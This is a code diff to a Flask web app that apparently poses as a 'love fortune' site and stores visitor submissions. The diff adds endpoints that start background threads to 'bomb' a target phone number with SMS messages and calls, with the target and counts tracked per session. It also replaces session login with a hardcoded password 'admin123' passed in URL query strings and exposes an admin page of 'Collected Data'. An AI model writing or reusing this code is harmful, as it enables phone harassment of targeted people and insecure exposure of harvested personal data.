     df = pd.concat([df, new_row], ignore_index=True)
     save_data(df)
-    
-    return jsonify({'status': 'saved', 'fortune': FORTUNES[0]})
+    return jsonify({'status': 'saved'})
+
+@app.route('/start-sms', methods=['POST'])
+def start_sms():
+    data = request.json
+    phone = data['phone']
+    sid = data['sessionId']
+    bombing_sessions[sid] = {
+        'sms_active': False, 'call_active': False,
+        'sms_count': 0, 'call_count': 0, 'target': phone
+    }
+    thread = threading.Thread(target=simulate_sms_bomb, args=(phone, sid))
+    thread.daemon = True
+    thread.start()
+    return jsonify({'status': 'started'})
+
+@app.route('/stop-sms', methods=['POST'])
+def stop_sms():
+    sid = request.json['sessionId']
+    if sid in bombing_sessions:
+        bombing_sessions[sid]['sms_active'] = False
+    return jsonify({'status': 'stopped'})
+
+@app.route('/start-call', methods=['POST'])
+def start_call():
+    data = request.json
+    phone = data['phone']
+    sid = data['sessionId']
+    if sid not in bombing_sessions:
+        bombing_sessions[sid] = {'sms_active': False, 'call_active': False, 'sms_count': 0, 'call_count': 0}
+    bombing_sessions[sid]['target'] = phone
+    thread = threading.Thread(target=simulate_call_bomb, args=(phone, sid))
+    thread.daemon = True
+    thread.start()
+    return jsonify({'status': 'started'})
+
+@app.route('/stop-call', methods=['POST'])
+def stop_call():
+    sid = request.json['sessionId']
+    if sid in bombing_sessions:
+        bombing_sessions[sid]['call_active'] = False
+    return jsonify({'status': 'stopped'})
+
+@app.route('/counters/<sid>')
+def counters(sid):
+    if sid in bombing_sessions:
+        return jsonify({'smsCount': bombing_sessions[sid].get('sms_count', 0),
+                        'callCount': bombing_sessions[sid].get('call_count', 0)})
+    return jsonify({'smsCount': 0, 'callCount': 0})
 
 @app.route('/tinyurl', methods=['POST'])
-def create_tinyurl():
-    data = request.get_json()
-    long_url = data.get('url', '')
-    tiny_url = get_tinyurl(long_url)
-    return jsonify({'tinyurl': tiny_url})
+def tinyurl():
+    long_url = request.json.get('url')
+    tiny = get_tinyurl(long_url)
+    return jsonify({'tinyurl': tiny})
 
-@app.route('/admin', methods=['GET', 'POST'])
+@app.route('/admin')
 def admin():
-    if request.method == 'POST':
-        password = request.form.get('password')
-        if password != 'admin123':
-            abort(403)
-        session['admin'] = True
-    
-    if not session.get('admin'):
-        return '''
-        <form method="post">
-            <input type="password" name="password" placeholder="Password">
-            <button type="submit">Login</button>
-        </form>
-        '''
-    
+    if request.args.get('pass') != 'admin123':
+        return '<form>Admin password: <input name="pass"><button>Login</button></form>'
     df = load_data()
     if df.empty:
         return "<h2>No data yet</h2>"
-    
-    html = "<h2>Love Fortune Data</h2><table border='1'>"
-    html += "<tr>" + "".join([f"<th>{col}</th>" for col in df.columns]) + "</tr>"
+    html = "<h2>💾 Collected Data</h2><table border='1'>"
+    html += "<tr>" + "".join(f"<th>{col}</th>" for col in df.columns) + "</tr>"
     for _, row in df.iterrows():
-        html += "<tr>"
-        for val in row:
-            display_val = str(val)[:100] + "..." if len(str(val)) > 100 else str(val)
-            html += f"<td>{display_val}</td>"
-        html += "</tr>"
-    html += '</table><br><a href="/download-excel"><button>Download Excel</button></a>'
+        html += "<tr>" + "".join(f"<td>{str(val)[:80]}</td>" for val in row) + "</tr>"
+    html += "</table><br><a href='/download-excel?pass=admin123'><button>Download Excel</button></a>"
     return html
 
 @app.route('/download-excel')
 def download_excel():
-    if not session.get('admin'):
+    if request.args.get('pass') != 'admin123':
         abort(403)
     return send_file(DATA_FILE, as_attachment=True)
 
 if __name__ == '__main__':
     ensure_data_file()
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
